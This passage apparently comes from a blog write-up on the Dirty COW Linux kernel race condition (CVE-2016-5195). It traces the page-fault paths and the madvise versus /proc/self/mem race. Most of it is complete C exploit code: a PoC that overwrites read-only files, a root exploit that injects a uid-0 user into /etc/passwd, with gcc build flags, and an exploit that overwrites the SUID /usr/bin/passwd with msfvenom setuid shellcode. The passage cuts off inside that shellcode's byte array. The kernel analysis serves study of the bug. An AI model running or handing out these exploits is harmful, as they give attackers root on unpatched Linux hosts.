<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">faultin_page()</span><br><span class="line">    handle_mm_fault()</span><br><span class="line">        __handle_mm_fault()</span><br><span class="line">            handle_pte_fault()//pte is NULL, first time of access</span><br><span class="line">                do_fault()//non-anonymous page, just take it in</span><br><span class="line">                    do_cow_fault()//we&#x27;re going to write the page</span><br><span class="line">                    	do_set_pte()</span><br><span class="line">                            maybe_mkwrite()</span><br><span class="line">                                pte_mkdirty()//mark it dirty</span><br></pre></td></tr></table></figure>

<p>Notice that at the final stage it’ll check for <code>VM_FAULT_WRITE</code> flag and clear the <code>FOLL_WRITE</code> bit in the caller’s flag filed. For allocating a writable page, the flag bit will be clear. But for a read-only page’s allocation, this stage will be ignored.</p>
<h3 id="Second-time-of-page-fault"><a href="#Second-time-of-page-fault" class="headerlink" title="Second time of page fault"></a>Second time of page fault</h3><p>Though we’d like to write on a read-only mapped page across the <code>/proc/self/mem</code>, the page fault handler do it in the traditional way, so the page is read-only for us yet, and the  <code>follow_page_mask()</code> will return NULL again, representing a page fault.</p>
<p>So we will enter the  <code>faultin_page()</code> again and do the copy-on-write. This time the kernel will allocate a new page for us to write, and the  <code>FOLL_WRITE</code> bit of variable  <code>foll_flags</code> in <code>__get_user_pages()</code> will be cleared in  <code>faultin_page()</code> ‘s final stage.</p>
<p>The call chain is as below:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">faultin_page()</span><br><span class="line">    handle_mm_fault()</span><br><span class="line">        __handle_mm_fault()</span><br><span class="line">            handle_pte_fault()</span><br><span class="line">                do_wp_page()</span><br><span class="line">                	reuse_swap_page(old_page)</span><br><span class="line">                		wp_page_reuse()</span><br></pre></td></tr></table></figure>

<p>After twice page fault, we’re back to the tag <code>retry</code> in  <code>__get_user_pages()</code> and try to get the page for the third time. Now the <code>FOLL_WRITE</code> bit is cleared, which means that <strong>the kernel will treat it as a writable page for us</strong>. So the  <code>follow_page_mask()</code> will get the page successfully finally.</p>
<h1 id="0x01-Analysis-of-the-vulnerability"><a href="#0x01-Analysis-of-the-vulnerability" class="headerlink" title="0x01. Analysis of the vulnerability"></a>0x01. Analysis of the vulnerability</h1><p>Now let’s have a review of the whole process of writing to a read-only mapped file by the <code>/proc/self/mem</code>.</p>
<h3 id="race-condition-under-multi-thread-environment"><a href="#race-condition-under-multi-thread-environment" class="headerlink" title="race condition under multi-thread environment"></a>race condition under multi-thread environment</h3><p>We can notice that the  <code>follow_page_mask()</code> check for whether the page will be written by the  <code>FOLL_WRITE</code> bit of <code>foll_flags</code> , but the operation of writing is decided by the <code>write</code> param passed to  <code>mem_rw()</code> . So there’s a subtle race condition there. Now let’s start two threads to make it:</p>
<ul>
<li>Thread[1]: Write the data to read-only mmapped file across the <code>/proc/self/mem</code> repeatedly. It’ll cause the copy-on-write.</li>
<li>Thread[2]: Use <code>madvise()</code> syscall to tell the kernel to mark the memory area of read-only mmapped file unused repeatedly. Then the page frame of this area will be released and the PTE will be cleared.</li>
</ul>
<p>Then it comes to the interesting part:</p>
<h3 id="Four-times-of-getting-pages-amp-Three-times-of-page-fault"><a href="#Four-times-of-getting-pages-amp-Three-times-of-page-fault" class="headerlink" title="Four times of getting pages &amp; Three times of page fault"></a>Four times of getting pages &amp; Three times of page fault</h3><p>We can easily notice that there’s a race condition like this:</p>
<ul>
<li>Thread[1] finished twice page fault, prepared to get the page for the third time.</li>
<li>Thread[2] used the <code>madvise()</code> syscall to clear the page.</li>
<li>Thread[1] failed to get the page for the third time, “page fault” again.</li>
</ul>
<p>Now the page mapped to the file will be back again just like how the first time of page fault was handled. So the program will try to get the page for the fourth time. Notice that <strong>the  <code>FOLL_WRITE</code> bit is cleared, the kernel will think that “we’re going to read this page”</strong>. So we can get the page <strong>“normally”</strong>.</p>
<p>But backing to the  <code>mem_rw()</code>, we’re trying to <strong>write</strong> the page in fact. So the file mapping page will be written directly. <strong>Then we have completed a privileged overwrite on a read-only file.</strong></p>
<h1 id="0x02-Exploit"><a href="#0x02-Exploit" class="headerlink" title="0x02. Exploit"></a>0x02. Exploit</h1><p>So we know that how dirtyCOW works now: just use two threads to make a race condition.</p>
<ul>
<li>Thread[1]: Write the data to read-only mmapped file across the <code>/proc/self/mem</code> repeatedly.</li>
<li>Thread[2]: Use <code>madvise()</code> syscall to tell the kernel to mark the memory area of read-only mmapped file unused repeatedly.</li>
</ul>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * CVE-2016-5195</span></span><br><span class="line"><span class="comment"> * dirty C-O-W</span></span><br><span class="line"><span class="comment"> * poc by arttnba3</span></span><br><span class="line"><span class="comment"> * 2021.4.14</span></span><br><span class="line"><span class="comment"> *  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">dst_st</span>, <span class="title">fk_st</span>;</span></span><br><span class="line"><span class="type">void</span> * <span class="built_in">map</span>;</span><br><span class="line"><span class="type">char</span> *fake_content;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> * argv)</span>;</span><br><span class="line"><span class="type">void</span> * <span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> * argv)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;usage: ./poc destination_file fake_file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> write_thread, madvise_thread;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> dst_fd, fk_fd;</span><br><span class="line">    dst_fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line">    fk_fd = open(argv[<span class="number">2</span>], O_RDONLY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of dst: %d\nfd of fk: %d\n&quot;</span>, dst_fd, fk_fd);</span><br><span class="line"></span><br><span class="line">    fstat(dst_fd, &amp;dst_st); <span class="comment">// get destination file length</span></span><br><span class="line">    fstat(fk_fd, &amp;fk_st); <span class="comment">// get fake file length</span></span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, dst_st.st_size, PROT_READ, MAP_PRIVATE, dst_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    fake_content = <span class="built_in">malloc</span>(fk_st.st_size);</span><br><span class="line">    read(fk_fd, fake_content, fk_st.st_size);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;madvise_thread, <span class="literal">NULL</span>, madviseThread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;write_thread, <span class="literal">NULL</span>, writeThread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pthread_join(madvise_thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(write_thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> * argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> mm_fd = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of mem: %d\n&quot;</span>, mm_fd);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        lseek(mm_fd, (<span class="type">off_t</span>) <span class="built_in">map</span>, SEEK_SET);</span><br><span class="line">        write(mm_fd, fake_content, fk_st.st_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> * argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100000</span>; i++)&#123;</span><br><span class="line">        madvise(<span class="built_in">map</span>, <span class="number">0x100</span>, MADV_DONTNEED);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We can see that we successfully overwrite a read-only file with our poc.</p>
<p><img src="https://i.loli.net/2021/04/14/KBuysmMaRiToVHc.png" alt="image.png"></p>
<h2 id="Privilege-Escalating"><a href="#Privilege-Escalating" class="headerlink" title="Privilege Escalating"></a>Privilege Escalating</h2><h3 id="一、add-a-new-root-privileged-user"><a href="#一、add-a-new-root-privileged-user" class="headerlink" title="一、add a new root-privileged user"></a>一、add a new root-privileged user</h3><p>We can modified the <code>/etc/passwd</code> and add a new user with root privilege. And the root comes with our login.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * CVE-2016-5195</span></span><br><span class="line"><span class="comment"> * dirty C-O-W</span></span><br><span class="line"><span class="comment"> * exploit by arttnba3</span></span><br><span class="line"><span class="comment"> * 2021.5.24</span></span><br><span class="line"><span class="comment"> *  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;crypt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">passwd_st</span>;</span></span><br><span class="line"><span class="type">void</span> * <span class="built_in">map</span>;</span><br><span class="line"><span class="type">char</span> *fake_user;</span><br><span class="line"><span class="type">int</span> fake_user_length;</span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> write_thread, madvise_thread;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> *username;</span><br><span class="line">    <span class="type">char</span> *hash;</span><br><span class="line">    <span class="type">int</span> user_id;</span><br><span class="line">    <span class="type">int</span> group_id;</span><br><span class="line">    <span class="type">char</span> *info;</span><br><span class="line">    <span class="type">char</span> *home_dir;</span><br><span class="line">    <span class="type">char</span> *shell;</span><br><span class="line">&#125;hacker = </span><br><span class="line">&#123;</span><br><span class="line">    .user_id = <span class="number">0</span>,</span><br><span class="line">    .group_id = <span class="number">0</span>,</span><br><span class="line">    .info = <span class="string">&quot;a3pwn&quot;</span>,</span><br><span class="line">    .home_dir = <span class="string">&quot;/root&quot;</span>,</span><br><span class="line">    .shell = <span class="string">&quot;/bin/bash&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> * argv)</span>;</span><br><span class="line"><span class="type">void</span> * <span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> * argv)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> passwd_fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;usage: ./dirty username password&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;do not forget to make a backup for the /etc/passwd by yourself&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hacker.username = argv[<span class="number">1</span>];</span><br><span class="line">    hacker.hash = crypt(argv[<span class="number">2</span>], argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    fake_user_length = <span class="built_in">snprintf</span>(<span class="literal">NULL</span>, <span class="number">0</span>, <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>, </span><br><span class="line">        hacker.username, </span><br><span class="line">        hacker.hash, </span><br><span class="line">        hacker.user_id, </span><br><span class="line">        hacker.group_id, </span><br><span class="line">        hacker.info, </span><br><span class="line">        hacker.home_dir, </span><br><span class="line">        hacker.shell);</span><br><span class="line">    fake_user = (<span class="type">char</span> * ) <span class="built_in">malloc</span>(fake_user_length + <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(fake_user, <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>, </span><br><span class="line">        hacker.username, </span><br><span class="line">        hacker.hash, </span><br><span class="line">        hacker.user_id, </span><br><span class="line">        hacker.group_id, </span><br><span class="line">        hacker.info, </span><br><span class="line">        hacker.home_dir, </span><br><span class="line">        hacker.shell);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    passwd_fd = open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of /etc/passwd: %d\n&quot;</span>, passwd_fd);</span><br><span class="line"></span><br><span class="line">    fstat(passwd_fd, &amp;passwd_st); <span class="comment">// get /etc/passwd file length</span></span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, passwd_st.st_size, PROT_READ, MAP_PRIVATE, passwd_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;madvise_thread, <span class="literal">NULL</span>, madviseThread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;write_thread, <span class="literal">NULL</span>, writeThread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pthread_join(madvise_thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(write_thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> * argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> mm_fd = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of mem: %d\n&quot;</span>, mm_fd);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        lseek(mm_fd, (<span class="type">off_t</span>) <span class="built_in">map</span>, SEEK_SET);</span><br><span class="line">        write(mm_fd, fake_user, fake_user_length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> * argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">        madvise(<span class="built_in">map</span>, <span class="number">0x100</span>, MADV_DONTNEED);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Don’t forget to compile with param <code>-lcrypt</code> .</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc dirty.c -o dirty -static -lpthread -lcrypt</span><br></pre></td></tr></table></figure>

<p>Run it, and we can get the root.</p>
<p><img src="https://i.loli.net/2021/05/24/2fU3GIw7W8BoTMe.png" alt="image.png"></p>
<h3 id="二、privileged-by-SUID"><a href="#二、privileged-by-SUID" class="headerlink" title="二、privileged by SUID"></a>二、privileged by SUID</h3><p>We can also overwrite some SUID programs(which will be run with the uid set in advance) to malicious code to archive the privilege escalating. I choose to overwrite  <code>/usr/bin/passwd</code>there.</p>
<blockquote>
<p>I used the <code>msfvenom</code> to construct the payload as below:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/exec PrependSetuid=True -f elf | xxd -i</span><br></pre></td></tr></table></figure>

</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * CVE-2016-5195</span></span><br><span class="line"><span class="comment"> * dirty C-O-W</span></span><br><span class="line"><span class="comment"> * poc by arttnba3</span></span><br><span class="line"><span class="comment"> * 2021.4.14</span></span><br><span class="line"><span class="comment"> *  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">dst_st</span>, <span class="title">fk_st</span>;</span></span><br><span class="line"><span class="type">void</span> * <span class="built_in">map</span>;</span><br><span class="line"><span class="type">char</span> *fake_content;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> sc[] = &#123;</span><br><span class="line">  <span class="number">0x7f</span>, <span class="number">0x45</span>, <span class="number">0x4c</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3e</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, 